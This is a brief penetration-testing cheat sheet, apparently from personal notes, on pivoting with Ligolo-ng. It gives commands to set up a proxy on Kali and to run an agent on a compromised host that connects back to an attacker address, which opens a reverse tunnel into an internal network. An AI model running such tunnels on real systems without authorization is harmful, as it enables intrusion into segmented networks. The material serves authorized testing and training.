---
title: "Ligolo Tunnel"
---

# Ligolo Tunnel

Reverse tunnel via Ligolo-ng for pivoting into segmented networks. The proxy runs on Kali and the agent runs on the compromised host, creating a TUN interface that transparently routes traffic to the internal network.

```shell
# Kali — create interface and start proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
~/exp/tools/lig_proxy-linux64 -selfcert

# Target (Debian/Linux) — connect to proxy
~/exp/tools/lig_agent-linux64 -connect 192.168.100.2:11601 -ignore-cert
```

```shell
# Ligolo — select session and get target network range
session
1
ifconfig

# Kali — add route to internal network
sudo ip route add 192.168.1.0/24 dev ligolo

# Ligolo — start the tunnel
start --tun ligolo
```
